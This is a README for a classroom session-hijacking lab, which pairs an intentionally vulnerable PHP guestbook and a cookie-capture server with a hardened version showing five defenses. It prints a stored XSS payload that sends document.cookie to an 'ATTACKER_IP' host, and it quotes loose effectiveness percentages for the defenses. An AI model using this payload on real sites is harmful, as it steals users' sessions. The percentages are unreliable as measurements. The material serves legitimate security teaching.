# 🧪 Session Hijacking — Demonstration Environment

Working, self-contained sample code for the project. It lets you run the
**attack**, then prove that each **defense** stops it — all on your own
machine or an isolated VM.

> ⚠️ **Ethics & safety:** Everything here is intentionally vulnerable.
> Run it **only** on an isolated lab network / VM with authorization.
> Never expose these apps to the public internet or attack systems you
> do not own.

---

## 📁 Folder structure

```
demo-environment/
├── README.md                         <- you are here
├── vulnerable-app/
│   └── index.php                     Insecure guestbook (XSS + weak cookie)
├── attacker/
│   ├── cookiecatcher.php             Cookie capture server + dashboard
│   └── xss-payloads.txt              Ready-to-use XSS payloads
├── secure-app/
│   ├── index.php                     Hardened guestbook (all 5 defenses)
│   ├── security.php                  sanitize() + waf_filter()
│   └── SecureSession.php             Hardened session manager
├── defenses/                         Standalone, documented examples
│   ├── 01_httponly_cookies.php
│   ├── 02_content_security_policy.php
│   ├── 03_input_sanitization.php
│   ├── 04_waf_modsecurity.conf
│   └── 05_session_management.php
└── setup/
    └── setup.sh                      One-command launcher for all servers
```

---

## 🚀 Quick start

**Requirements:** PHP 7.4+ (`php -v`). No database needed.

```bash
cd demo-environment/setup
bash setup.sh
```

This launches three servers:

| Service         | URL                     | Role                         |
|-----------------|-------------------------|------------------------------|
| Vulnerable app  | http://localhost:8001   | The target                   |
| Secure app      | http://localhost:8002   | The hardened version         |
| CookieCatcher   | http://localhost:8080   | Attacker's capture dashboard |

Press **Ctrl+C** to stop everything.

> Prefer to start them manually? Run each in its own terminal:
> ```bash
> php -S 0.0.0.0:8001 -t vulnerable-app
> php -S 0.0.0.0:8002 -t secure-app
> php -S 0.0.0.0:8080 -t attacker attacker/cookiecatcher.php
> ```

---

## 🎯 Part 1 — Run the attack (vulnerable app)

1. Find your machine IP: `hostname -I`
2. Open **http://localhost:8001** (the vulnerable guestbook).
3. In the comment box, paste a payload from `attacker/xss-payloads.txt`,
   replacing `ATTACKER_IP` with your IP:
   ```html
   <img src=x onerror="this.src='http://ATTACKER_IP:8080/?c='+document.cookie">
   ```
4. Submit, then **reload the page** so the stored payload runs.
5. Open the **CookieCatcher dashboard** at http://localhost:8080.
   You should see the captured `PHPSESSID` — the session is now stealable.

**Why it worked:** no input encoding, no CSP, and a JS-readable cookie.

---

## 🛡️ Part 2 — Prove the defenses (secure app)

1. Open **http://localhost:8002** (the secure guestbook).
2. Paste the *same* payload and submit.
3. Observe:
   - The WAF may block the request with **403** (Defense #4).
   - If stored, it is shown as **plain text**, not executed (Defense #3).
   - `document.cookie` in DevTools is **empty** for the session cookie
     (Defense #1, HttpOnly).
   - Inline scripts are refused by the browser (Defense #2, CSP).
4. Check http://localhost:8080 — **no new capture** appears.

---

## 📚 Part 3 — Study each defense individually

Each file in `defenses/` is runnable and heavily commented:

```bash
php defenses/01_httponly_cookies.php
php defenses/02_content_security_policy.php
php defenses/03_input_sanitization.php
php defenses/05_session_management.php
# 04 is a ModSecurity config — see the install notes inside the file
```

| # | Defense                         | Effectiveness | Complexity |
|---|---------------------------------|---------------|------------|
| 1 | HttpOnly / Secure / SameSite    | ~98%          | Very low   |
| 2 | Content Security Policy         | ~95%          | Medium     |
| 3 | Input validation & encoding     | ~100%         | Medium     |
| 4 | Web Application Firewall (WAF)  | ~85%          | High       |
| 5 | Advanced session management     | ~88%          | High       |
| — | **All combined (defense-in-depth)** | **~99.99%** | Med–High |

---

## 🧰 Troubleshooting

- **Cookie not captured on the vulnerable app?** Make sure you used your
  real IP (not `localhost`) in the payload, and that port 8080 is reachable.
- **Secure flag stops the cookie over HTTP?** The secure app calls
  `SecureSession::start(false)` to allow the demo over plain HTTP. Set it
  to `true` when serving over HTTPS in production.
- **Port already in use?** Edit the ports in `setup/setup.sh`.

---

## ✅ What this demonstrates (maps to learning outcomes)

- **C02** – Hacking cycle, security principles in practice
- **C03** – Both attack *and* layered defense construction
- **C04** – Clear, reproducible technical documentation
- **C05** – Ethical, authorized, isolated testing methodology
